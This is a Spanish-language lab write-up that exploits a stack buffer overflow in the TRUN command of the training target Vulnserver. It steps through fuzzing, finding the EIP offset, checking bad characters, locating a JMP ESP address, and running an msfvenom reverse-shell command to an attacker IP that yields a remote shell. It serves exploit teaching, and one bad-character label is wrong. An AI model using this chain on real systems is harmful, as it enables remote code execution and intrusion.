# M6T1 - Explotación Vanilla Stack Buffer Overflow

En esta práctica se explota una vulnerabilidad de tipo **Vanilla Stack Buffer Overflow**.  
Para su correcta realización es necesario haber configurado previamente el entorno de laboratorio.

---


## Consideraciones iniciales

### Ejecución Vulnserver

Nos posicionamos en el directorio indicado y ejecutamos:

````bash
vulnserver.exe
````

<img width="1479" height="417" alt="image" src="https://github.com/user-attachments/assets/21ccfd29-e783-47cc-9dea-05c3019d231e" />

Si todo es correcto, el servidor mostrará un mensaje indicando que está en ejecución.

<img width="1304" height="248" alt="image" src="https://github.com/user-attachments/assets/8050c03a-878f-4a3d-a83d-aaedcbb6fa67" />


## Comprobación de la conexión

#### Obtención de la dirección IP

En primer lugar, necesitamos conocer la dirección IP de la máquina Windows 10. Para ello, ejecutamos el siguiente comando:

```bash
ipconfig
````

<img width="1169" height="395" alt="image" src="https://github.com/user-attachments/assets/4522f50c-26b3-4fb0-9942-f55597c5a056" />

En este caso, la dirección IP asignada es: 192.168.1.136

#### Conexión al servicio

Desde Kali Linux, establecemos una conexión con VulnServer mediante Netcat, añadimos a la IP de la máquina web el pueto que utiliza **VulnServer**, el 9999:

```bash
nc 192.168.1.136 9999
````

<img width="1718" height="225" alt="image" src="https://github.com/user-attachments/assets/a741cb07-eff7-44b3-b055-510cf7b6d2a1" />

Comprobamos que podemos conectar con nuestro servidor vulnerable.

## Enumeración de comandos

Una vez verificada la conectividad con **VulnServer**, el siguiente paso consiste en identificar los comandos disponibles que acepta el servidor.

Para ello, utilizamos el comando `HELP`:

<img width="1902" height="485" alt="image" src="https://github.com/user-attachments/assets/40663f57-1847-40c2-9ec4-4dc20ef4f038" />

## Análisis estático del binario con IDA

Antes de realizar el fuzzing, se ha llevado a cabo un análisis estático del binario `vulnserver.exe` utilizando **IDA Free**, con el objetivo de identificar posibles puntos vulnerables en la aplicación.

### Análisis de imports

A través de la vista de imports (`View -> Open subviews -> Imports`), se han identificado diversas funciones de la librería estándar de C (`msvcrt`) que son potencialmente inseguras:

```text
strcpy
strncpy
memcpy
printf
strlen
````

<img width="1919" height="1002" alt="image" src="https://github.com/user-attachments/assets/e383cd52-119e-4ab4-a29b-ab38b3b93d82" />

Estas funciones no realizan validación de tamaño en los buffers, lo que las convierte en candidatas a provocar desbordamientos de memoria.

### Análisis de funciones

A través de la vista de funciones (`Functions`) y el pseudocódigo generado, se ha inspeccionado el flujo de ejecución del programa, prestando especial atención a las funciones que gestionan entradas del usuario.

Durante este análisis, se ha identificado que el comando **TRUN** es procesado por una función susceptible de recibir datos sin validación adecuada de longitud.

### Hipótesis de vulnerabilidad

El comando **TRUN** se considera un candidato potencial a vulnerabilidad de tipo **Stack Buffer Overflow**, ya que:

- Acepta entrada controlada por el usuario.
- No parece implementar mecanismos de validación de tamaño.
- Hace uso de funciones inseguras de manejo de memoria.

## Fuzzing del comando TRUN

Una vez identificado el comando TRUN como posible vector de ataque, se ha procedido a realizar fuzzing para comprobar su comportamiento ante entradas de gran tamaño.

### Máquina víctima (Windows 10)

1. Abrir **Immunity Debugger** con privilegios de administrador.
2. Cargar el ejecutable:
```File → Attach → vulnserver.exe```
3. Por defecto se abre en pausa, debemos pulsar RUN.

De esta forma, VulnServer queda en ejecución y monitorizado por el debugger.

<img width="1919" height="1028" alt="image" src="https://github.com/user-attachments/assets/f0d496ca-36f1-43a4-b54f-0f969083727f" />


### Máquina atacante (Kali Linux)

Se verifica la conectividad con el servicio:

```bash
nc 192.168.1.136 9999
```
Si el servidor responde con un banner, la conexión es correcta.

### Procedimiento

Vamos a utilizar el script **Python3Fuzzing.py**, proporcionado por TheMalwareGuardian, este envía peticiones al comando TRUN incrementando progresivamente el tamaño del buffer.

El payload enviado sigue la estructura:

```text
TRUN . + "A" * tamaño_variable
```

En cada iteración, el tamaño del buffer aumenta, permitiendo identificar el punto en el que la aplicación deja de comportarse correctamente.

### Ejecución

El script se ejecuta desde la máquina atacante (Kali Linux), mientras que el servicio VulnServer se monitoriza mediante Immunity Debugger en la máquina Windows.

### Resultado

Exploit> Connect to target
Server> Welcome to Vulnerable Server! Enter HELP for help.

Exploit> Fuzzing b'TRUN' command with 100 bytes
Server> TRUN COMPLETE

--------------------------------------

Exploit> Fuzzing b'TRUN' command with 400 bytes
Server> TRUN COMPLETE

--------------------------------------

Exploit> Fuzzing b'TRUN' command with 700 bytes
Server> TRUN COMPLETE

--------------------------------------

Exploit> Fuzzing b'TRUN' command with 1000 bytes
Server> TRUN COMPLETE

--------------------------------------

Exploit> Fuzzing b'TRUN' command with 1300 bytes
Server> TRUN COMPLETE

--------------------------------------

Exploit> Fuzzing b'TRUN' command with 1600 bytes
Server> TRUN COMPLETE

--------------------------------------

Exploit> Fuzzing b'TRUN' command with 1900 bytes
Server> TRUN COMPLETE

--------------------------------------

Exploit> Fuzzing b'TRUN' command with 2200 bytes

El servidor responde correctamente a inputs de hasta aproximadamente 1900 bytes.

Durante este proceso, al seguir incrementando el tamaño del buffer, la aplicación termina produciendo un fallo observable en Immunity Debugger:

<img width="1919" height="1033" alt="image" src="https://github.com/user-attachments/assets/e3ec28ce-116c-4f8a-aea4-0b5fad6a7b52" />

Al incrementar progresivamente el tamaño del buffer enviado al comando `TRUN`, la aplicación termina deteniéndose de forma inesperada.

En el debugger se observa el siguiente error:

```text
Access violation when executing 41414141
```

Este comportamiento indica que:

- El buffer enviado ha sobrescrito la memoria.
- Se ha alcanzado el registro EIP.
- El flujo de ejecución del programa está siendo controlado por datos del usuario.

Confirmando que existe una vulnerabilidad de tipo Stack Buffer Overflow.

## Descubrimiento del offset del registro EIP

Una vez identificado el crash mediante fuzzing y confirmado el control parcial del registro EIP, el siguiente paso consiste en determinar el número exacto de bytes necesarios para sobrescribir dicho registro.

Para esta tarea utilizaremos el script **Python3EIPOffsetDiscovery.py**, proporcionado por TheMalwareGuardian. No obstante, es necesario adaptar el patrón de entrada a nuestras necesidades, generándolo previamente con la herramienta **Mona** dentro de Immunity Debugger.

---

### Generación del patrón con Mona

Desde la consola de Immunity Debugger, ejecutamos:

```bash
!mona pattern_create 3000
```
Este comando genera un patrón cíclico de 3000 bytes, suficiente para alcanzar y sobrescribir el registro EIP.

El patrón se guarda automáticamente en la siguiente ruta:

```text
C:\mona\vulnserver\pattern.txt
````

<img width="1430" height="718" alt="image" src="https://github.com/user-attachments/assets/aa4be400-4071-435a-99fd-133c964d7407" />


Se debe copiar la cadena correspondiente a la sección ASCII y sustituirla en el script de Python.

### Ejecución del script

Se ejecuta el script contra el servicio vulnerable:


<img width="1919" height="237" alt="image" src="https://github.com/user-attachments/assets/909b5089-6181-4f7d-9968-ad489aaadc54" />


Esto provocará nuevamente el crash de la aplicación, pero en esta ocasión el valor del registro EIP contendrá una parte del patrón.

<img width="1919" height="1001" alt="image" src="https://github.com/user-attachments/assets/6328e3d8-1c15-4914-8c5a-4b9c383f4808" />

En este caso:

```text
EIP = 396F4338
```

### Cálculo del offset

Para determinar la posición exacta del valor encontrado en EIP dentro del patrón, se utiliza Mona:

````bash
!mona pattern_offset 396f4338
````

Resultado:

<img width="1144" height="344" alt="image" src="https://github.com/user-attachments/assets/a09ff828-0281-4571-bf6a-980215de0346" />

```text
Found in cyclic pattern at position 2006
```

Esto confirma que:

El desbordamiento de buffer alcanza el registro EIP en el byte 2006.


## Control del registro EIP

Una vez determinado el offset exacto necesario para sobrescribir el registro EIP (2006 bytes), se procede a verificar el control total del flujo de ejecución.

Para ello, se construye un payload específico que sobrescribe EIP con un valor controlado.

---

### Construcción del payload

El buffer utilizado es:

```python
buffer = b'A' * 2006 + b'BBBB'
````

### Ejecución del script

Se ha utilizado el script **Python3ControlEIP.py** proporcionado por TheMalwareGuardian para enviar el payload al servicio vulnerable:

<img width="814" height="194" alt="image" src="https://github.com/user-attachments/assets/620dfd0f-7f5d-4a96-a4d4-59f97a77e77c" />


La aplicación vulnerable se detiene en Immunity Debugger mostrando:


<img width="1912" height="999" alt="image" src="https://github.com/user-attachments/assets/8fcff928-73fa-49b7-93d0-f538dc0ba7f9" />


```text
Acces violation when executing 42424242
```

El valor 0x42424242 corresponde a la cadena ASCII 'BBBB', lo que confirma que:

- El offset calculado (2006 bytes) es correcto.
- El registro EIP ha sido sobrescrito de forma controlada.
- Se tiene control total sobre el flujo de ejecución del programa.


## Identificación de Bad Characters

Antes de generar el shellcode final, es necesario identificar los **bad characters**, es decir, aquellos bytes que pueden corromper el payload durante su procesamiento por la aplicación vulnerable.

Estos caracteres pueden ser interpretados de forma especial por el programa (por ejemplo, como terminadores de cadena), provocando truncamiento o modificación de los datos enviados.

---

### Caracteres problemáticos comunes

Algunos de los bad characters más habituales son:

```text
\x00 → Null byte
\x0A → New Line
\x0D → Carriage Return
\xFF → Form Feed
````

### Generación del bytearray

Para identificar estos caracteres, se genera una secuencia de todos los bytes posibles (0x00 a 0xFF).

En Immunity Debugger, utilizamos Mona:

```bash
!mona bytearray -b "\x00"
```

Esto genera este archivo:

<img width="1417" height="705" alt="image" src="https://github.com/user-attachments/assets/664dede5-ed8c-434e-892b-a36e515f9756" />


### Ejecución del script

Para la realización de este apartado utilizamos el script **Python3FindBadChars.py** proporcionado por TheMalwareGuardian:

<img width="1912" height="160" alt="image" src="https://github.com/user-attachments/assets/b456aa05-bae4-4be0-ac21-7e6508a9a68c" />

En ImmunnityDebbuger comprobamos con Mona:

```bash
!mona compare -f C:\mona\vulnserver\bytearray.bin -a ESP
```

<img width="1514" height="642" alt="image" src="https://github.com/user-attachments/assets/ab554441-6b13-4533-9c3d-6a489a016624" />

El resultado mostrado por Mona es:
 
```text
Corruption after 0 bytes
Badchars: 00
```

Del análisis se concluye que:

- El único bad character es: \x00
- No se detecta corrupción en el resto de bytes
- Los caracteres \x01 a \xFF son seguros para su uso en el payload

## Redirección de ejecución mediante JMP ESP

Una vez que se ha conseguido el control del registro EIP y se han identificado los bad characters, el siguiente objetivo es redirigir la ejecución hacia el shellcode.


### ¿Por qué JMP ESP?

El registro **ESP (Extended Stack Pointer)** apunta a la parte superior de la pila (stack), donde se encuentra nuestro payload.

Si logramos que el registro **EIP** apunte a una instrucción `JMP ESP`, el flujo de ejecución saltará directamente al contenido del stack, permitiendo ejecutar el código controlado por el atacante.


### Identificación de la instrucción JMP ESP

Para localizar una instrucción `JMP ESP`, se utiliza la herramienta Mona dentro de Immunity Debugger.

En primer lugar, se analizan los módulos cargados:

```bash
!mona modules
```

A partir del documento generado:

<img width="1919" height="699" alt="image" src="https://github.com/user-attachments/assets/f2e17275-bb6d-4126-9a6d-4eef0cab8bd3" />

Se selecciona un módulo adecuado, en este caso:

```text
essfunc.dll
````
- Sin ASLR (Address Space Layout Randomization)
- Sin DEP (Data Execution Prevention)
- Sin SafeSEH


### Búsqueda de JMP ESP

Una vez identificado el módulo, se busca la instrucción JMP ESP evitando bad characters (\x00):

```bash
!mona find -s "\xff\xe4" -m essfunc.dll -cpb "\x00"
````

<img width="1835" height="226" alt="image" src="https://github.com/user-attachments/assets/39dc5168-16a8-41fa-9251-ca568f79c558" />

Elegímos la dirección:

```text
0x625011AF
```

### Ejecución script

Ejecutamos el script **Python3JMPESP.py** proporcionado por TheMalwareGuardian, editando la dirección si fuera necesario.

<img width="1919" height="999" alt="image" src="https://github.com/user-attachments/assets/c03aba88-82c8-411f-aac1-405881bb7c32" />

Tras ejecutar el script, se observa que el registro EIP es sobrescrito con la dirección de una instrucción JMP ESP. Al ejecutar paso a paso, el flujo salta al stack, donde se encuentra el payload, confirmando el control total de ejecución al alcanzarse los breakpoints (INT3).

## Integración del shellcode y explotación final

Una vez conseguido el control total de la ejecución del programa, el siguiente paso consiste en integrar un shellcode funcional dentro del payload para lograr la ejecución remota de código.

### Shellcode utilizado

Se ha generado un shellcode mediante msfvenom, diseñado para establecer una conexión reversa hacia la máquina atacante.

El shellcode ha sido generado excluyendo el bad character identificado (\x00) y utilizando codificación para garantizar su correcta ejecución.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.137 LPORT=4444 EXITFUNC=thread -b "\x00" -f python
````

<img width="1081" height="672" alt="image" src="https://github.com/user-attachments/assets/854abb3f-3c8b-44f5-b63b-890fd62bc261" />


### Ejecución del script

Ejecutamos el script **Python3Shellcode.py** agregando nuestro shellcode al script mientras ejecutamos:

````bash
sudo nc -nlvp 4444
````

### Resultado

En la máquina atacante, mediante un listener (netcat), se recibe una conexión desde la máquina vulnerable, obteniendo acceso a una shell remota.

<img width="676" height="186" alt="image" src="https://github.com/user-attachments/assets/93c4229e-a3ed-4706-9331-113092e0b20d" />


### Conclusión

Se ha conseguido la explotación completa de la vulnerabilidad de tipo buffer overflow, logrando la ejecución de código arbitrario mediante la integración de shellcode.

Este paso demuestra el impacto real de la vulnerabilidad, permitiendo el control total del sistema afectado.





